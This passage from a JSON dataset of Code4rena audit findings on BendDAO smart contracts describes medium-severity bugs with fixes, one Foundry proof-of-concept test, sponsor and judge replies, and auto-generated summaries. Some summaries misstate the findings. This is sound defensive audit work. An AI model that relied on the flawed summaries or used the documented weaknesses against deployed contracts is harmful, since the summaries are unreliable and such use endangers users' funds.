      "content": "\nIsolated Margin Lending the BendDAO protocol will calculate the health factor based on a single collateral (one NFT), the liquidation of collateral will be achieved by selling the NFT through an auction mechanism.\n\nHowever, the borrower who gets liquidated (his NFT is in the auction state) still able to repay his loan and close the auction, by triggering `IsolateLiquidation.sol#isolateRedeem()`. Each asset has a redemption threshold `redeemThreshold` to define the minimum debt repayment amount by the borrower.\n\n```solidity\nFile: IsolateLogic.sol#executeIsolateRedeem()\n\nvars.redeemAmounts[vars.nidx] = vars.borrowAmount.percentMul(nftAssetData.redeemThreshold);\n```\n\nThe `redeemThreshold` is updateable from `Configurator.sol#setAssetAuctionParams()` with a max value of `10_000`. In case the user calls `IsolateLiquidation.sol#isolateRedeem()` and `nftAssetData.redeemThreshold` is `10_000` (`MAX_REDEEM_THRESHOLD`). This will be set `scaledAmount` to zero.\n\n```solidity\nFile: IsolateLogic.sol#executeIsolateRedeem()\n\n       loanData.scaledAmount -= vars.amountScaled;\n```\n\nThis means the debt is fully paid; however,\n1. The `loanData.loanStatus` will still be in active state `Constants.LOAN_STATUS_ACTIVE`.\n2. The `erc721TokenData.LockerAddr` is not updated to `address(0)`.\n\nSo, the user is not able to withdraw his NFT from `BVault.sol` or even update the loan state and `LockerAddr` values through `IsolateLending.sol#isolateRepay()` due to [this check](https://github.com/code-423n4/2024-07-benddao/blob/main/src/libraries/logic/ValidateLogic.sol#L498-L500)\n\nNote: The only way the user can unlock his NFT is by borrowing again. This will increase `loanData.scaledAmount` again to greater than zero, and then he needs to repay that loan  `IsolateLending.sol#isolateRepay()` to update the `erc721TokenData.LockerAddr` to `address(0)`. This will expose the user to the unnecessary risk of being liquidated again.\n\n### Impact\n\nUsers are forced to borrow again to unlock their NFTs after Isolate Redeem.\n\n### Proof of Concept\n\nFoundry PoC - Please copy the following POC in `TestIntIsolateRedeem.t.sol`:\n\n```solidity\n  function test_Withdraw_After_Full_Redeem_Should_Revert() public {\n    TestCaseLocalVars memory testVars;\n\n    tsHEVM.startPrank(tsPoolAdmin);\n    tsConfigurator.setAssetAuctionParams(tsCommonPoolId, address(tsBAYC), 10000, 500, 2000, 1 days);\n    tsHEVM.stopPrank();\n    // deposit\n    prepareUSDT(tsDepositor1);\n    uint256[] memory tokenIds = prepareIsolateBAYC(tsBorrower1);\n\n    // borrow\n    prepareBorrow(tsBorrower1, address(tsBAYC), tokenIds, address(tsUSDT));\n\n    // make some interest\n    advanceTimes(365 days);\n\n    // drop down nft price\n    actionSetNftPrice(address(tsBAYC), 5000);\n\n    // auction\n    prepareAuction(tsLiquidator1, address(tsBAYC), tokenIds, address(tsUSDT));\n\n    uint256[] memory redeemAmounts = new uint256[](tokenIds.length);\n    testVars.loanDataBefore = getIsolateLoanData(tsCommonPoolId, address(tsBAYC), tokenIds);\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n      testVars.totalBidAmount += testVars.loanDataBefore[i].bidAmount;\n      testVars.totalBidFine += testVars.loanDataBefore[i].bidFine;\n      testVars.totalRedeemAmount += testVars.loanDataBefore[i].redeemAmount;\n      redeemAmounts[i] = testVars.loanDataBefore[i].redeemAmount;\n    }\n\n    testVars.poolBalanceBefore = tsUSDT.balanceOf(address(tsPoolManager));\n    testVars.walletBalanceBefore1 = tsUSDT.balanceOf(address(tsLiquidator1));\n    testVars.walletBalanceBefore2 = tsUSDT.balanceOf(address(tsBorrower1));\n\n    // redeem\n    tsBorrower1.approveERC20(address(tsUSDT), type(uint256).max);\n    tsBorrower1.isolateRedeem(tsCommonPoolId, address(tsBAYC), tokenIds, address(tsUSDT), redeemAmounts);\n    testVars.txAuctionTimestamp = block.timestamp;\n\n    // check results\n    testVars.loanDataAfter = getIsolateLoanData(tsCommonPoolId, address(tsBAYC), tokenIds);\n    for (uint256 i = 0; i < tokenIds.length; i++) {\n      assertEq(testVars.loanDataAfter[i].bidStartTimestamp, 0, 'bidStartTimestamp');\n      assertEq(testVars.loanDataAfter[i].firstBidder, address(0), 'firstBidder');\n      assertEq(testVars.loanDataAfter[i].lastBidder, address(0), 'lastBidder');\n      assertEq(testVars.loanDataAfter[i].bidAmount, 0, 'bidAmount');\n      assertEq(testVars.loanDataAfter[i].scaledAmount, 0, 'scaledAmount');\n    }\n    tsHEVM.expectRevert(bytes(Errors.ASSET_ALREADY_LOCKED_IN_USE));\n    tsBorrower1.withdrawERC721(\n      tsCommonPoolId,\n      address(tsBAYC),\n      tokenIds,\n      Constants.SUPPLY_MODE_ISOLATE,\n      address(tsBorrower1),\n      address(tsBorrower1)\n    );\n  }\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nIn case `loanData.scaledAmount == 0` call\n`VaultLogic.erc721SetTokenLockerAddr(nftAssetData, params.nftTokenIds[vars.nidx], address(0));`.\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/31#issuecomment-2297877596):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/e535e2af895ab04a44218cce8e4512bc6e897583).\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue in the Isolated Margin Lending feature of the BendDAO protocol. The protocol calculates a user's health factor based on a single collateral (an NFT) and if the user's collateral is liquidated, it is sold through an auction. However, there is a problem where a borrower can still repay their loan and close the auction, even if their NFT is in the auction state. This is due to a bug in the code that sets a redemption threshold for each asset. If the user's redemption threshold is set to the maximum value, the borrower's debt will be considered fully paid, but the loan status will still be active and the NFT will not be unlocked. This means that the user cannot withdraw their NFT from the protocol or update the loan status, exposing them to the risk of being liquidated again. The bug was identified using the Foundry tool and a proof of concept was provided. The recommended mitigation step is to add a function that updates the NFT's locker address if the borrower's debt is fully paid. The BendDAO team has confirmed and fixed this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/31",
      "tags": [],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "36890",
      "title": "[M-08] Fee-on-Transfer tokens cause problems in multiple places",
      "impact": "MEDIUM",
      "content": "\nThe protocol is designed to ensure it is compatible with fee-on-transfer tokens (Fee-on-transfer is in scope). For example, the `erc20TransferInLiquidity()` function checks the balance before and after, and calculates the difference between these values to measure the tokens received\n\n```solidity\nFile: VaultLogic.sol\n\n448:   function erc20TransferInBidAmount(DataTypes.AssetData storage assetData, address from, uint256 amount) internal {\n449:     address asset = assetData.underlyingAsset;\n450:     uint256 poolSizeBefore = IERC20Upgradeable(asset).balanceOf(address(this));\n451: \n452:     assetData.totalBidAmout += amount;\n453: \n454:     IERC20Upgradeable(asset).safeTransferFrom(from, address(this), amount);\n455: \n456:     uint256 poolSizeAfter = IERC20Upgradeable(asset).balanceOf(address(this));\n457:     require(poolSizeAfter == (poolSizeBefore + amount), Errors.INVALID_TRANSFER_AMOUNT);\n458:   }\n```\n\nBut at the end of the logic, it has a required check if the contract received the exact intended amount\nthese two features are not compatible If the `asset` is Fee-on-transfer tokens the requirement will keep revert\n\nExample:\n1. Contract `balanceOf` is 2000 of Fee-on-transfer tokens.\n2. Contract transfer from user `amount == 1000`.\n3. Fee is collected, so the contract received only 950 tokens, but the require will check `2000 + 1000 ==  2950` and revert.\n\n### Impact\n\nAny function/feature that calls:\n\n- `erc20TransferInLiquidity()`\n- `erc20TransferOutLiquidity()`\n- `erc20TransferBetweenWallets()`\n- `erc20TransferOutBidAmount()`\n- `erc20TransferInBidAmount()`\n\nin `VaultLogic.sol` will revert if the asset is Fee-on-transfer tokens.\n\n### Recommended Mitigation Steps\n\nWhen fee-on-transfer tokens should be supported, you need to check the actual balance differences but don't expect to receive the exact amount. If they are not supported, this should be documented.\n\n### Assessed type\n\nERC20\n\n**[thorseldon (BendDAO) disputed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/32#issuecomment-2297879341):**\n > We suggest adjust the severity level to Informative.\n> \n> For now we don't support the token fee-on-transfer. Maybe it's will be optimised in future if we really need to support those tokens.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/32#issuecomment-2298662690):**\n > I fully understand your point. However, the [audit `README` states that `Fee on transfer ERC20s` are in scope](https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/README.md?plain=1#L251). The audit `README` is part of the *source of truth* for wardens during this audit and I have to judge according to that. Therefore, I cannot legitimately downgrade this finding even if it's not of relevance.  \n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the protocol's compatibility with fee-on-transfer tokens. The protocol is designed to check the balance before and after a transfer to ensure the correct amount of tokens were received. However, this feature is not compatible with fee-on-transfer tokens, as the contract may not receive the exact intended amount due to fees being collected. This can cause the contract to revert and potentially impact any function that calls certain ERC20 transfer functions. The recommended mitigation steps include documenting whether fee-on-transfer tokens are supported and adjusting the severity level to \"Informative\". The assessed type of this bug is ERC20, and although the team does not currently support fee-on-transfer tokens, it was stated in the audit's README that they are in scope, so the finding cannot be downgraded.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/32",
      "tags": [],
      "finders": [
        "Ch\\_301"
      ]
    },
    {
      "id": "36889",
      "title": "[M-07] `executeYieldBorrowERC20()` checking `yieldCap` is wrong",
      "impact": "MEDIUM",
      "content": "\nIn `executeYieldBorrowERC20()`, we will check whether `stakerAddr` exceeds `yieldCap`.\n\n```solidity\n  function executeYieldBorrowERC20(InputTypes.ExecuteYieldBorrowERC20Params memory params) internal {\n...\n    ValidateLogic.validateYieldBorrowERC20(params, poolData, assetData, groupData);\n\n@>  vars.totalSupply = VaultLogic.erc20GetTotalCrossSupply(assetData, groupData.borrowIndex);\n\n    // check asset level yield cap limit\n    vars.totalBorrow = VaultLogic.erc20GetTotalCrossBorrowInGroup(groupData, groupData.borrowIndex);\n    require(\n      (vars.totalBorrow + params.amount) <= vars.totalSupply.percentMul(assetData.yieldCap),\n      Errors.YIELD_EXCEED_ASSET_CAP_LIMIT\n    );\n\n    // check staker level yield cap limit\n    vars.stakerBorrow = VaultLogic.erc20GetUserCrossBorrowInGroup(groupData, vars.stakerAddr, groupData.borrowIndex);\n    require(\n      (vars.stakerBorrow + params.amount) <= vars.totalSupply.percentMul(ymData.yieldCap),\n      Errors.YIELD_EXCEED_STAKER_CAP_LIMIT\n    );\n```\n\nThe code above, calculating `totalSupply` using `totalSupply = totalScaledCrossSupply * groupData.borrowIndex` to calculate `supply` is wrong. The correct way to calculate `supply` is to use: `assetData.supplyIndex`.\n\n### Impact\n\nWith an incorrect value for `totalSupply`, the check for `yieldCap` will be inaccurate, leading to a security risk.\n\n### Recommended Mitigation\n\n```diff\n  function executeYieldBorrowERC20(InputTypes.ExecuteYieldBorrowERC20Params memory params) internal {\n...\n    ValidateLogic.validateYieldBorrowERC20(params, poolData, assetData, groupData);\n\n-   vars.totalSupply = VaultLogic.erc20GetTotalCrossSupply(assetData, groupData.borrowIndex);\n+   vars.totalSupply = VaultLogic.erc20GetTotalCrossSupply(assetData, assetData.supplyIndex);\n\n    // check asset level yield cap limit\n    vars.totalBorrow = VaultLogic.erc20GetTotalCrossBorrowInGroup(groupData, groupData.borrowIndex);\n```\n\n### Assessed type\n\nContext\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/35#issuecomment-2297880596):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/5508640677c0060cc5a9fdc34a18cd36f0f2517f).\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the `executeYieldBorrowERC20()` function in the BendDAO code. This function checks whether a user's borrowing amount exceeds the yield cap set for the asset being borrowed. However, the code used to calculate the total supply of the asset is incorrect, which can lead to an inaccurate check for the yield cap. This can pose a security risk. The recommended mitigation is to use the correct code to calculate the total supply. The bug has been fixed in the codebase. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/35",
      "tags": [],
      "finders": [
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "36888",
      "title": "[M-06] `YieldEthStakingLido` lacks a limit on the max stake amount, which may result in the unstake exceeding `MAX_STETH_WITHDRAWAL_AMOUNT`, resulting in the token not being retrieved",
      "impact": "MEDIUM",
      "content": "\nIn `YieldEthStakingLido`, the main processes are as follows:\n\n1. `stake()` -> stEth balance increase\n2. `unstake () -> unstETH.requestWithdrawals(allShares)`\n3. `repay() -> unstETH.claimWithdrawal()`\n\nThe issue is the second step, `unstETH` is with a maximum withdrawal limit: `MAX_STETH_WITHDRAWAL_AMOUNT`\n\n```solidity\ncontract YieldEthStakingLido is YieldStakingBase {\n...\n  function protocolRequestWithdrawal(YieldStakeData storage sd) internal virtual override {\n    IYieldAccount yieldAccount = IYieldAccount(yieldAccounts[msg.sender]);\n\n    uint256[] memory requestAmounts = new uint256[](1);\n    requestAmounts[0] = sd.withdrawAmount;\n    bytes memory result = yieldAccount.execute(\n      address(unstETH),\n@>    abi.encodeWithSelector(IUnstETH.requestWithdrawals.selector, requestAmounts, address(yieldAccount))\n    );\n    uint256[] memory withdrawReqIds = abi.decode(result, (uint256[]));\n    require(withdrawReqIds.length > 0 && withdrawReqIds[0] > 0, Errors.YIELD_ETH_WITHDRAW_FAILED);\n    sd.withdrawReqId = withdrawReqIds[0];\n  }\n```\n\n<https://docs.lido.fi/contracts/withdrawal-queue-erc721/#requestwithdrawals>\n\n> each amount in `_amounts` must be greater than or equal to `MIN_STETH_WITHDRAWAL_AMOUNT` and lower than or equal to `MAX_STETH_WITHDRAWAL_AMOUNT`.\n\nCurrent configuration [here](https://github.com/lidofinance/lido-dao/blob/master/contracts/0.8.9/WithdrawalQueue.sol#L57).\n\n```solidity\n    /// @notice maximum amount of stETH that is possible to withdraw by a single request\n    /// Prevents accumulating too much funds per single request fulfillment in the future.\n    /// @dev To withdraw larger amounts, it's recommended to split it to several requests\n    uint256 public constant MAX_STETH_WITHDRAWAL_AMOUNT = 1000 * 1e18;\n```\n\n`lido` suggests that if it exceeds this value, it needs to be taken in batches, but `YieldEthStakingLido.sol` can only be taken at once. If the stake amount exceeds this value, it will not be possible to `unstake()` and the `token` will be locked in the contract.\n\nAssumption: `leverageFactor = 50000 , eth price = $2500`\n\nAs long as the value of the nft is greater than `1000 * $2500 / 5 = $500,000` it will be possible to `stake()` more than `MAX_STETH_WITHDRAWAL_AMOUNT`.\nAfter that, when the user performs an `unstake()` it will fail, causing the token to be locked.\n\n### Impact\n\nExcessive amount of stake will result in failure to `unstake()`.\n\n### Recommended Mitigation\n\n`YieldStakingBase` add  method `checkStakeAmount`. Each sub contract override implements its own maximum amount limit, `YieldEthStakingLido` suggests a maximum of `MAX_STETH_WITHDRAWAL_AMOUNT/2`.\n\n### Assessed type\n\nContext\n\n**[0xTheC0der (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/36#issuecomment-2296848336):**\n > Downgrading to Medium due to reduced likelihood of such great stake amounts.\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/36#issuecomment-2297881720):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/4af137eb1e2de720d6b7c183fb36fcfef989ebbd).\n\n***\n\n",
      "summary": "\nThe YieldEthStakingLido contract has a bug in its unstaking process. When a user tries to unstake their tokens, there is a limit to how much they can withdraw at once. This limit is set by the MAX_STETH_WITHDRAWAL_AMOUNT variable and is currently set to 1000 stETH. If a user tries to unstake more than this amount, their tokens will be locked in the contract and they will not be able to withdraw them. This bug can be mitigated by adding a new method called checkStakeAmount in the YieldStakingBase contract, which will limit the maximum amount that can be unstaked. The severity of this bug has been downgraded to Medium, as it is less likely to occur with large stake amounts. The bug has been fixed in the BendDAO contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/36",
      "tags": [],
      "finders": [
        "bin2chen",
        "oakcobalt"
      ]
    },
    {
      "id": "36887",
      "title": "[M-05] `wrapNativeTokenInWallet()` always reverts on Arbitrum",
      "impact": "MEDIUM",
      "content": "\n`VaultLogic.wrapNativeTokenInWallet()` is used in a number of places\nIt's mainly used to store `msg.value` into `WETH` and then transfer it to `msg.sender`.\n\n```solidity\n  function wrapNativeTokenInWallet(address wrappedNativeToken, address user, uint256 amount) internal {\n    require(amount > 0, Errors.INVALID_AMOUNT);\n\n    IWETH(wrappedNativeToken).deposit{value: amount}();\n\n@>  bool success = IWETH(wrappedNativeToken).transferFrom(address(this), user, amount);\n    require(success, Errors.TOKEN_TRANSFER_FAILED);\n  }\n```\n\nThe token transfer is done using the `transferFrom` method. This works fine on most chains (Ethereum, Optimism, Polygon, BSC) which use the standard WETH9 contract that handles the case src == msg.sender:\n\n```solidity\nWETH9.sol\nif (src != msg.sender && allowance[src][msg.sender] != uint(- 1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n```\n\nThe problem is that the WETH implementation on Arbitrum uses [a different contract](https://arbiscan.io/address/0x8b194beae1d3e0788a1a35173978001acdfba668#code), and does not have this `src == msg.sender` handling.\n\n### Impact\n\n`wrapNativeTokenInWallet()` revert, `BVault/CrossLending...` contracts that use this method don't execute correctly.\n\n### Recommended Mitigation\n\n```diff\n  function wrapNativeTokenInWallet(address wrappedNativeToken, address user, uint256 amount) internal {\n    require(amount > 0, Errors.INVALID_AMOUNT);\n\n    IWETH(wrappedNativeToken).deposit{value: amount}();\n\n-   bool success = IWETH(wrappedNativeToken).transferFrom(address(this), user, amount);\n+   bool success = IWETH(wrappedNativeToken).transfer(user, amount);\n    require(success, Errors.TOKEN_TRANSFER_FAILED);\n  }\n```\n\n### Assessed type\n\nContext\n\n**[thorseldon (BendDAO) confirmed and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/42#issuecomment-2297883348):**\n > Fixed [here](https://github.com/BendDAO/bend-v2/commit/c7b6150929440505bbbd8a6d15955e56609053f2).\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the code for the `VaultLogic.wrapNativeTokenInWallet()` function, which is used to store and transfer a specific type of token called `WETH`. The transfer process works correctly on most chains, but not on Arbitrum due to a different contract being used. This bug causes the function to fail, affecting other contracts that use it. The recommended solution is to change the code to use a different method for the token transfer. The bug has been confirmed and fixed by the BendDAO team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/42",
      "tags": [],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "36886",
      "title": "[M-04] Unhandled request invalidation by the owner of Etherfi will lead to stuck debt",
      "impact": "MEDIUM",
      "content": "\nThe `owner` of Etherfi has the ability to invalidate withdrawal requests, which will DoS `YieldEthStakingEtherfi::protocolClaimWithdraw()` without ever repaying the debt. Additionally, Etherfi has a mechanism to manually claim the invalidated withdrawal, which will leave the withdraw request in a DoSed state in `YieldEthStakingEtherfi`.\n\n### Proof of Concept\n\n`WithdrawRequestNFT::claimWithdraw()` from Etherfi [checks](https://github.com/etherfi-protocol/smart-contracts/blob/master/src/WithdrawRequestNFT.sol#L94) that the request is valid. The owner of `WithdrawRequestNFT` may [invalidate](https://github.com/etherfi-protocol/smart-contracts/blob/master/src/WithdrawRequestNFT.sol#L174) the request at any time and claim it for [itself](https://github.com/etherfi-protocol/smart-contracts/blob/master/src/WithdrawRequestNFT.sol#L135).\n\nThus, as withdrawals in `YieldEthStakingEtherfi` can not be canceled and there is no way to handle invalidated withdrawals, the debt from the nft will never be repaid if the owner claims the nft for itself. If the owner validates the request later, there will still be a period of unknown duration during which it's not possible to repay the debt.\n\n### Tools Used\n\nVscode, Foundry\n\n### Recommended Mitigation Steps\n\nCreate a mechanism to handle invalidated withdrawals or withdrawals that have been claimed by the owner.\n\n**[thorseldon (BendDAO) acknowledged and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/55#issuecomment-2301250858):**\n > After carefully reading the `WithdrawRequestNFT` code, we decided that we could only contact Etherfi and manually handle this special case of InvalidRequest according to the actual situation. Only after understanding the details can we give a reasonable solution. We can trust that Etherfi will not maliciously invalidate requests.\n> \n> We suggest adjust the severity level to Informative.\n\n***\n\n",
      "summary": "\nThe owner of Etherfi can cause a denial-of-service (DoS) attack on the `YieldEthStakingEtherfi` protocol by invalidating withdrawal requests without repaying the debt. There is also a way for the owner to manually claim the invalidated withdrawals, leaving them in a DoSed state. This can result in the debt never being repaid. The issue can be mitigated by creating a mechanism to handle these invalidated withdrawals or those claimed by the owner. The recommended steps are to contact Etherfi and manually handle these cases, and to trust that Etherfi will not intentionally invalidate requests. The severity level of this bug may be adjusted to Informative.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/55",
      "tags": [],
      "finders": [
        "0x73696d616f"
      ]
    },
    {
      "id": "36885",
      "title": "[M-03] If an isolated borrower/bidder is blacklisted by the debt token, risk of DOS liquidation/auction of the corresponding loan",
      "impact": "MEDIUM",
      "content": "\nIf a debt asset has a blacklisting feature (e.g., USDC), and an isolated borrower/bidder is blacklisted by the asset token, isolated liquidation/auction of the corresponding loan can be DOSsed.\n\nWhen a user is blacklisted by an erc20 token, the asset cannot be transferred in or out of the blacklisted user’s account.\n\n1. A bidder is blacklisted after they placed the bid for an isolated loan auction through `IsolateLogic::executeIsolateAuction`.\n\nWhen the next bidder outbids by calling `IsolateLogic::executeIsolateAuction`, the previous bidder’s bid amount is returned. Because previous bidder is blacklisted after placing the bid, `VaultLogic.erc20TransferOutBidAmount(debtAssetData, vars.oldLastBidder, vars.oldBidAmount)` will revert the auction tx. At this point, no one can bid on the loan.\n\n```solidity\n//src/libraries/logic/IsolateLogic.sol\n\n  function executeIsolateAuction(InputTypes.ExecuteIsolateAuctionParams memory params) internal {\n...\n      // transfer last bid amount to previous bidder from escrow\n      if ((vars.oldLastBidder != address(0)) && (vars.oldBidAmount > 0)) {\n        VaultLogic.erc20TransferOutBidAmount(debtAssetData, vars.oldLastBidder, vars.oldBidAmount);\n      }\n...\n```\n\nhttps://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L262\n\n2. The borrower is blacklisted by the debt token.\n\nAfter the auction ends, when the liquidator calls `executeIsolateLiquidate()`, if the last bid amount is greater than total debt, the extra amount (last bid amount - total debt) has to be transferred to the borrower in the current implementation.\n\n```solidity\n//src/libraries/logic/IsolateLogic.sol\n\n  function executeIsolateLiquidate(InputTypes.ExecuteIsolateLiquidateParams memory params) internal {\n...\n      // transfer remain amount to borrower\n      if (vars.remainBidAmounts[vars.nidx] > 0) {\n        VaultLogic.erc20TransferOutBidAmount(debtAssetData, tokenData.owner, vars.remainBidAmounts[vars.nidx]);\n      }\n...\n```\n\nhttps://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/IsolateLogic.sol#L444\n\nHowever, `VaultLogic.erc20TransferOutBidAmount(debtAssetData, tokenData.owner, vars.remainBidAmounts[vars.nidx])` will revert due to the original borrower (`tokenData.owner`) is blacklisted.\n\n### Recommended Mitigation Steps\n\nIn the isolate auction or liquidation flow, consider using try-catch block to handle `VaultLogic.erc20TransferOutBidAmount`.\n\n**[thorseldon (BendDAO) acknowledged and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/56#issuecomment-2297898424):**\n > We suggest adjust the severity level to Informative.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/56#issuecomment-2299148076):**\n > According to the `README`, which is a source of truth in this audit,  [`Pausability`](https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/README.md?plain=1#L255) and [`Blocklists`](https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/README.md?plain=1#L266) (blacklisting) of ERC20 tokens are in scope.  \n> \n> Therefore, I have to treat this as a viable risk and cannot justify a downgrade of the issue, even if not immediately relevant in the vast majority of practical cases.\n\n***\n\n",
      "summary": "\nThis bug report discusses a potential issue with a debt asset that has a blacklisting feature, such as USDC. If a user is blacklisted by the asset token, they will not be able to transfer the asset in or out of their account. The report also mentions two specific instances where this blacklisting feature can cause problems. In the first instance, a bidder is blacklisted after placing a bid for an isolated loan auction, which causes the auction to fail and prevents anyone else from bidding on the loan. In the second instance, the borrower is blacklisted by the debt token, which can result in the liquidation process failing to transfer the remaining bid amount to the borrower. The report recommends using a try-catch block to handle these potential issues. The severity level of this bug is considered informative, but the judge in charge of the audit has decided to treat it as a viable risk and cannot downgrade the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/56",
      "tags": [],
      "finders": [
        "bin2chen",
        "Ch\\_301",
        "oakcobalt"
      ]
    },
    {
      "id": "36884",
      "title": "[M-02] Risk of mass liquidation after pool/asset pause and unpause, due to borrow interest compounding implementation",
      "impact": "MEDIUM",
      "content": "\nCurrent pausing features allow a pool to be globally paused (all assets borrow, repay, liquidation pausing) and asset pausing (specific asset borrow, repay, liquidation pausing). See [`validatePoolBasic()`](https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/ValidateLogic.sol#L29) and [`validateAssetBasic()`](https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/ValidateLogic.sol#L43) which are checked in borrow, [repay](https://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/ValidateLogic.sol#L281-L282), and will revert if the pool or the asset is paused.\n\nThe problem is the borrow interest compounding implementation (`InterestLogic::_updateBorrowIndex`) will not factor in the duration of pausing when a user cannot repay a loan.\n\n```solidity\n//src/libraries/logic/InterestLogic.sol\n  function _updateBorrowIndex(DataTypes.AssetData storage assetData, DataTypes.GroupData storage groupData) internal {\n    // borrow index only gets updated if there is any variable debt.\n    // groupData.borrowRate != 0 is not a correct validation,\n    // because a positive base variable rate can be stored on\n    // groupData.borrowRate, but the index should not increase\n    if ((groupData.totalScaledCrossBorrow != 0) || (groupData.totalScaledIsolateBorrow != 0)) {\n        //@audit Case: asset paused and unpaused, assetData.lastUpdateTimestamp will be a timestamp before paused, interests compound during pausing \n|>      uint256 cumulatedBorrowInterest = MathUtils.calculateCompoundedInterest(\n        groupData.borrowRate,\n        assetData.lastUpdateTimestamp\n      );\n      uint256 nextBorrowIndex = cumulatedBorrowInterest.rayMul(groupData.borrowIndex);\n      groupData.borrowIndex = nextBorrowIndex.toUint128();\n    }\n  }\n```\n\nhttps://github.com/code-423n4/2024-07-benddao/blob/117ef61967d4b318fc65170061c9577e674fffa1/src/libraries/logic/InterestLogic.sol#L281\n\nInterests continuously compound with no repayment allowed. When unpaused, many accounts are vulnerable to immediate liquidation out of users' control.\n\n### Recommended Mitigation Steps\n\nConsider storing pause/unpause timestamp to allow skipping borrow interests compounding for the duration of the pause.\n\n**[thorseldon (BendDAO) acknowledged and commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/58#issuecomment-2297900491):**\n > It's our service design. Pause & unpause should be only used for emergency case, the accrued interest should be very small.\n> \n> We suggest adjust the severity level to Informative.\n\n**[0xTheC0der (judge) commented](https://github.com/code-423n4/2024-07-benddao-findings/issues/58#issuecomment-2299342885):**\n > Although pause durations are intended to be small, they can be arbitrarily long and put users at risk on unpausing due to compounding in the meantime. This could be mitigated on contract level; therefore, leaning towards maintaining Medium severity.\n\n***\n\n",
      "summary": "\nThe current pausing features of a pool allow for it to be paused globally or for specific assets. However, there is a bug where the interest compounding feature does not take into account the duration of pausing when a user is unable to repay a loan. This means that when the pool is unpaused, users may be vulnerable to immediate liquidation without their control. The recommended mitigation is to store the pause/unpause timestamp to skip interest compounding during the pause. The developers have acknowledged this issue and suggest adjusting the severity level to Informative, but the judge believes it should remain at Medium severity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "BendDAO",
      "source_link": "https://code4rena.com/reports/2024-07-benddao",
      "github_link": "https://github.com/code-423n4/2024-07-benddao-findings/issues/58",
      "tags": [],
      "finders": [
        "oakcobalt"
      ]
    },
    {
      "id": "36883",
      "title": "[M-01] PriceOracle has invalid checks on price staleness",
      "impact": "MEDIUM",
